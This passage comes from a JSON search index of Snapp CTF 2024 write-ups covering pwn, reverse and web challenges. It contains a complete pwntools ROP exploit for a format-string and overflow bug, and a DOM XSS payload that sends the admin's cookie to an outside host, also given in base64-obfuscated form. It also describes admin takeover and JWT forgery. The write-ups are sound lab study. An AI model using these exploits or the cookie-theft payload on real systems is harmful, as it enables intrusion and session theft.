<code>b'9606\\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'+p64(0x00401307)</code></p> <p></p>"},{"location":"2024/Snapp-ctf-2024/pwn/snapp_shell/","title":"Snapp shell","text":""},{"location":"2024/Snapp-ctf-2024/pwn/snapp_shell/#snapp-shell","title":"Snapp Shell","text":"<pre><code>My [**shell**](https://snappctf.com/tasks/snappshell_fc8d87fc117c34914b7c1b1d1255e6305ae9a072.txz) is broken, can you fix it for me? No you can't = )\n\n`nc 91.107.177.236 3117`\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/pwn/snapp_shell/#solution","title":"Solution","text":"<p>There was 4 functionality in the program, one was exit, other one was cat which was disabled and there were two functionality which were useful for the exploitation, <code>echo</code> function that was vulnerable to format string and was used to leak the canary and address of <code>main</code> function and the base of program for gadgets that we might need, and the <code>find_index</code> function which  was vulnerable to overflow with <code>gets</code> function allowing us to jmp wherever we need.</p> <p>After a long search for pop rdi gadget to leak the libc address to bypass ASLR, I was hopelessly searching writeups to figure what to do when I found https://ctftime.org/writeup/36368 which was the Idea and once more I opened r2 and found out that it is actually there with a <code>0x62050</code> difference to the libc base address, so used puts function to leak that and after that return again to main and after that using the pop rdi gadget inside libc to pop bin/sh string to the rdi and finally calling system function.</p> <pre><code>p=process('./snapp_shell')\n\n# Leak canary\np.sendline('1')\np.recvuntil('input\\n')\np.sendline('%7$p')\nx=p.recvline()\ncan=p64(int(x,16))\n\n# get main address\np.sendline('1')\np.recvuntil('input\\n')\np.sendline('%15$p')\nx=p.recvline()\nmain=int(x,16)\n\n# Compute some useful addresses or just set to find their real address later\nexe = main-0x0000140d\nputs = exe+0x10e4\nret = exe+0x101a\ndiff = 0x62050\nsystem = 0x50d70\nbinsh = 0x1d8678\npop_rdi = 0x2a3e5\n\n# First step exploit\np.sendline('3')\npay=b'SNAPPaaaabaaacaaadaaaeaa'+can+b'aaaabaaa'+p64(ret)+p64(puts)+p64(ret)+p64(main)\np.sendline(pay)\np.recvuntil('input is')\np.recvline()\nlc = p.recvline()\nlcd = u64(lc[:-1]+b'\\x00\\x00')\nlibc = lcd - diff\n\n# Second step exploit\np.sendline('3')\npay=b'SNAPPaaaabaaacaaadaaaeaa'+can+b'aaaabaaa'+p64(ret)+p64(libc+pop_rdi)+p64(libc+binsh)+p64(libc+system)\np.sendline(pay)\n</code></pre> <p></p>"},{"location":"2024/Snapp-ctf-2024/rev/blink/","title":"Blink","text":""},{"location":"2024/Snapp-ctf-2024/rev/blink/#description","title":"Description","text":"<pre><code>In the\u00a0Blink\u00a0of an eye, the reverse challenge unveiled secrets that should forever remain buried and unrecoverable.\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/rev/blink/#solution","title":"Solution","text":"<p>After downloading the challenge files, I see there are many files:</p> <ul> <li>069b823.raw</li> <li>31b3f8b.raw</li> <li>4da6ff5.raw</li> <li>8e1f2bc.raw</li> <li>acd3730.raw</li> <li>ae329eb.raw</li> <li>f488e59.raw</li> <li>blink</li> </ul> <p>For the first step, I checked the blink file in the DIE (Detect It Easy) application to understand what type of executable it is:</p> <p></p> <p>As shown in the picture, It\u2019s an ELF Linux executable. I opened it in IDA but after seeing the graph, I decided to check it later. At that moment I preferred to understand the program interactively. The program just returns what we write in stdin after a null terminator byte. I checked the other files but suddenly, I noticed that those are like ASCII arts and they complete each other. I decide to cat all of the files and pipe the output to the blink program. Its output is:</p> <p></p> <p>Then I copied the output to an editor and the result was:</p> <p></p> <pre><code>____  _   _    _    ____  ____   ____  __  ___     _____  _ _   _     ____  _                 _     _____  _____   __  ___       ____       ____  _  _              ___  _ _       ___     _   _ _____ _____     _     ___   __  _____      _          ____        _  _       _____        ____      ___\n/ ___|| \\ | |  / \\  |  _ \\|  _ \\ / /  \\/  |/ _ \\ __|___  |(_) \\ | |   | ___|| |_ __ ___  _ __ | |   |___ / |_   _|__\\ \\/ / |_    / ___|  ___|  _ \\| || |  _ __ ___  ( _ )| / |_ __ / _ \\   | \\ | | ____|___ /  __| |   / _ \\ / _||___  | __ / \\   _ __ | ___| _ __ | || |  _ _|___ / _ __  / ___|   _| \\ \\\n\\___ \\|  \\| | / _ \\ | |_) | |_) | || |\\/| | | | / __| / / | |  \\| |   |___ \\| | '_ ` _ \\| '_ \\| |     |_ \\   | |/ _ \\\\  /| __|   \\___ \\ / __| |_) | || |_| '_ ` _ \\ / _ \\| | | '_ \\ (_) |  |  \\| |  _|   |_ \\ / _` |  | | | | |_    / / '__/ _ \\ | '_ \\|___ \\| '_ \\| || |_| '__||_ \\| '_ \\| |  | | | | || |\n ___) | |\\  |/ ___ \\|  __/|  __&lt; &lt; | |  | | |_| \\__ \\/ /  | | |\\  |    ___) |_| | | | | | |_) | |___ ___) |  | |  __//  \\| |_     ___) | (__|  _ &lt;|__   _| | | | | | (_) | | | | | \\__, |  | |\\  | |___ ___) | (_| |  | |_| |  _|  / /| | / ___ \\| | | |___) | |_) |__   _| |  ___) | | | | |__| |_| |_| &gt; &gt;\n|____/|_| \\_/_/   \\_\\_|   |_|   | ||_|  |_|\\___/|___/_/___|_|_| \\_|___|____/(_)_| |_| |_| .__/|_____|____/___|_|\\___/_/\\_\\\\__|___|____/ \\___|_| \\_\\  |_| |_| |_| |_|\\___/|_|_|_| |_| /_/___|_| \\_|_____|____/ \\__,_|___\\___/|_|___/_/ |_|/_/   \\_\\_| |_|____/| .__/   |_| |_| |____/|_| |_|\\____\\__, (_)| |\n                                 \\_\\                 |_____|     |_____|                |_|             |_____|             |_____|                                                   |_____|                     |_____|    |_____|                         |_|                                |___/  /_/\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/rev/turnob/","title":"TurnOB","text":""},{"location":"2024/Snapp-ctf-2024/rev/turnob/#description","title":"Description","text":"<pre><code>TurnOB, the elegant binary, covertly converts the input message to hexadecimal and discreetly prints the result, preserving its secrecy.\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/rev/turnob/#solution","title":"Solution","text":"<p>After downloading, I checked the files and there are two files:</p> <ul> <li>turnob</li> <li>flag.enc</li> </ul> <p>In many CTFs, this scheme points to an encrypt/decrypt operation. There are many ways to reverse these challenges. First I decide to interact with the program itself except disassembly algorithms. For the first attempt, I decided to create a dictionary of printable letters (ASCII numbers) and the program output:</p> <pre><code>mapping = {\n    'a2:a7': '1', 'af:a7': '2', 'bc:a7': '3', 'c9:a7': '4', 'd6:a7': '5', 'e3:a7': '6', 'f0:a7': '7',\n    'fd:a7': '8', '0a:a7': '9', '95:a7': '0', '12:a7': 'a', '1f:a7': 'b', '2c:a7': 'c', '39:a7': 'd',\n    '46:a7': 'e', '53:a7': 'f', '60:a7': 'g', '6d:a7': 'h', '7a:a7': 'i', '87:a7': 'j', '94:a7': 'k',\n    'a1:a7': 'l', 'ae:a7': 'm', 'bb:a7': 'n', 'c8:a7': 'o', 'd5:a7': 'p', 'e2:a7': 'q', 'ef:a7': 'r',\n    'fc:a7': 's', '09:a7': 't', '16:a7': 'u', '23:a7': 'v', '30:a7': 'w', '3d:a7': 'x', '4a:a7': 'y',\n    '57:a7': 'z', '72:a7': 'A', '7f:a7': 'B', '8c:a7': 'C', '99:a7': 'D', 'a6:a7': 'E', 'b3:a7': 'F',\n    'c0:a7': 'G', 'cd:a7': 'H', 'da:a7': 'I', 'e7:a7': 'J', 'f4:a7': 'K', '01:a7': 'L', '0e:a7': 'M',\n    '1b:a7': 'N', '28:a7': 'O', '35:a7': 'P', '42:a7': 'Q', '4f:a7': 'R', '5c:a7': 'S', '69:a7': 'T',\n    '76:a7': 'U', '83:a7': 'V', '90:a7': 'W', '9d:a7': 'X', 'aa:a7': 'Y', 'b7:a7': 'Z', 'f8:a7': '_',\n    '6e:a7': '-', '64:a7': '{', '7e:a7': '}', 'd2:a7': '!'\n}\n</code></pre> <p>Then I tried to match them with the <code>flag.enc</code> content. Also for each key, there is a suffix of <code>a7</code> I decide to just add it to my mapping keys. The final code:</p> <pre><code>mapping = {\n    'a2:a7': '1', 'af:a7': '2', 'bc:a7': '3', 'c9:a7': '4', 'd6:a7': '5', 'e3:a7': '6', 'f0:a7': '7',\n    'fd:a7': '8', '0a:a7': '9', '95:a7': '0', '12:a7': 'a', '1f:a7': 'b', '2c:a7': 'c', '39:a7': 'd',\n    '46:a7': 'e', '53:a7': 'f', '60:a7': 'g', '6d:a7': 'h', '7a:a7': 'i', '87:a7': 'j', '94:a7': 'k',\n    'a1:a7': 'l', 'ae:a7': 'm', 'bb:a7': 'n', 'c8:a7': 'o', 'd5:a7': 'p', 'e2:a7': 'q', 'ef:a7': 'r',\n    'fc:a7': 's', '09:a7': 't', '16:a7': 'u', '23:a7': 'v', '30:a7': 'w', '3d:a7': 'x', '4a:a7': 'y',\n    '57:a7': 'z', '72:a7': 'A', '7f:a7': 'B', '8c:a7': 'C', '99:a7': 'D', 'a6:a7': 'E', 'b3:a7': 'F',\n    'c0:a7': 'G', 'cd:a7': 'H', 'da:a7': 'I', 'e7:a7': 'J', 'f4:a7': 'K', '01:a7': 'L', '0e:a7': 'M',\n    '1b:a7': 'N', '28:a7': 'O', '35:a7': 'P', '42:a7': 'Q', '4f:a7': 'R', '5c:a7': 'S', '69:a7': 'T',\n    '76:a7': 'U', '83:a7': 'V', '90:a7': 'W', '9d:a7': 'X', 'aa:a7': 'Y', 'b7:a7': 'Z', 'f8:a7': '_',\n    '6e:a7': '-', '64:a7': '{', '7e:a7': '}', 'd2:a7': '!'\n}\n\n# The encoded string\nprovided_string = \"5c:1b:72:35:35:64:5c:6d:95:ef:69:a6:d6:09:f8:6d:bc:9d:f8:99:16:0e:d5:f8:16:f0:7a:a1:d2:09:aa:f8:a2:bb:f8:8c:d2:7e:a7\"\n\n# Split the provided string into substrings of length 4\nsubstrings = provided_string.split(\":\")\ndecoded_string = ''.join(mapping.get(sub + \":a7\", \"*\") for sub in substrings)\nprint(decoded_string)\n</code></pre> <p>The result:</p> <p><code>SNAPP{Sh0rTE5t_h3X_DuMp_u7il!tY_1n_C!}</code></p>"},{"location":"2024/Snapp-ctf-2024/rev/visits/","title":"Visits","text":""},{"location":"2024/Snapp-ctf-2024/rev/visits/#description","title":"Description","text":"<pre><code>The origin of certain Windows binaries might not be Micro$oft Windows, posing a challenge when it comes to debugging them, like Vitis.\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/rev/visits/#solution","title":"Solution","text":"<p>After downloading the attachments, I checked the program in DIE (Detect it Easy) to have a better understanding of the executable type:</p> <p></p> <p>It was an unpacked dotnet file, so I opened it in the dnspy and the flag is exactly in front of my eyes:)))</p> <p></p>"},{"location":"2024/Snapp-ctf-2024/web/snapp_cat/","title":"Snapp cat","text":"<p>First of all when we browse the given url we're faced with a swagger documentation.  I tried to call some of them but all seemed to require authentication except the register and login endpoints. So I tried the register endpoint and found out that the required phone number format is as follows: +123456789012 I registered an account using the required values and logged in to the application and got a authentication token. Afterwards, I tried to access /api/user/1 but it needed my email to be verified. I called the email verification and got the new email verified token. Then I called the /api/user/1 endpoint and it returned some information like username and phone number of admin. After that I called /api/user/login-with-phone endpoint with the Admin's phone number and it returned th sha256 hash of OTP. I cracked the hash and logged in as admin user. Now that I had the admin privilege I tried to access /api/cat/random-cat-image endpoint and it generated a uuid for me. Then I called /api/cat/create with random values and it showed me an error saying that an error has been occured in /app/index.js. I gave the /app/index.js as input to imagePath parameter and then tried to get the file from /api/cat/{catId}. It returned the base64 encoded index.js file. I noticed an endpoint like /secret and tried to call it but it didn't work. So I took a closer look and noticed that a claim should be set in my JWT that isn't set by default. So I took the JWT secret from index.js file and generated a new token with required property and called the secret endpoint again.  Finally I was awarded with the flag.</p>"},{"location":"2024/Snapp-ctf-2024/web/snapp_cat/#solution","title":"Solution","text":"<ol> <li> <p>register </p> </li> <li> <p>login </p> </li> <li> <p>login with phone </p> </li> <li> <p>crack hash </p> </li> <li> <p>send login code </p> </li> <li> <p>email verification </p> </li> <li> <p>get verification code from session </p> </li> <li> <p>send email verification code </p> </li> <li> <p>get admin info </p> </li> <li> <p>login with admin phone </p> </li> <li> <p>crack admin login code </p> </li> <li> <p>send admin login code </p> </li> <li> <p>become admin </p> </li> <li> <p>random cat </p> </li> <li> <p>create cat with path /etc/passwd </p> </li> <li> <p>get data </p> </li> <li> <p>/etc/passwd data read </p> </li> <li> <p>get /app/index.js  </p> </li> </ol> <p>19 get flag with new jwt secret  </p> <pre><code>SNAPP{7dc998269394314896af6378f15c2c12}\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/web/snapp_fal/","title":"Snapp fal","text":"<pre><code>From now on Snapp can offer you fals if you want.\n\n[Download attachments](https://snappctf.com/tasks/snappfal_0bfd799152fef7299463752d840c3225f64cb259.txz)\n\n**Notes for beginners**\n\n-[https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n\n-You need to get XSS on https://snappfal.spchallenge.ir/\n\n-When you got it, report your payload to https://snappfal-support.spchallenge.ir/\n\n-A virtual browser will visit your payload... flag is in the cookies of\u00a0`snappfal.spchallenge.ir`. Simply write a payload that steals\u00a0`document.cookie`\u00a0and submit the payload to\u00a0[https://snappfal-support.spchallenge.ir/](https://snappfal-support.spchallenge.ir/).\n\n-If your payload doesn't work on Admin bot, contact support.\n\n-Admin closes the browser after 5 seconds.\n\n-`src.js`\u00a0is the source code of the website.\n\n-`bot.js`\u00a0is the script that controls the virtual browser ( You can ignore it ).\n</code></pre> <p>when we visit the website we encounter a page like this</p> <p></p>"},{"location":"2024/Snapp-ctf-2024/web/snapp_fal/#solution","title":"Solution","text":"<p>if we click on the button it will be like this for a few seconds and the redirects us to previous page</p> <p> if wee look at the page source</p> <p></p> <p></p> <p>the input parameter back is for redirecting the user to an arbitrary page. so we can cause a dom-based XSS here by using javascript schema</p> <p></p> <p>the goal of the challenge is to read the flag which is inside admin's cookie</p> <p></p> <p>I used this payload to redirect admin back to my server containing it's cookie as query string</p> <pre><code>window.location=\"https://eowlxdv1oni96il.m.pipedream.net/?f=\"+document.cookie\n</code></pre> <p>and the finalized url is</p> <pre><code>https://snappfal.spchallenge.ir/fal?back=javascript:eval(atob(%27d2luZG93LmxvY2F0aW9uPSJodHRwczovL2Vvd2x4ZHYxb25pOTZpbC5tLnBpcGVkcmVhbS5uZXQvP2Y9Iitkb2N1bWVudC5jb29raWUK%27))\n</code></pre> <p></p> <pre><code>SNAPP{89d36f80b85bde916fbdeb8592c1b368}\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/web/welcome/","title":"welcome","text":""},{"location":"2024/Snapp-ctf-2024/web/welcome/#welcome","title":"Welcome","text":"<pre><code>Welcome to SnappCTF web hackers!!!\n\n[https://welcome.spchallenge.ir/](https://welcome.spchallenge.ir/)\n</code></pre>"},{"location":"2024/Snapp-ctf-2024/web/welcome/#solution","title":"Solution","text":"<p>The flag was separated in three parts - The first part is visible in the index - The second part is a comment in the index - The third part is a response header </p>"}]}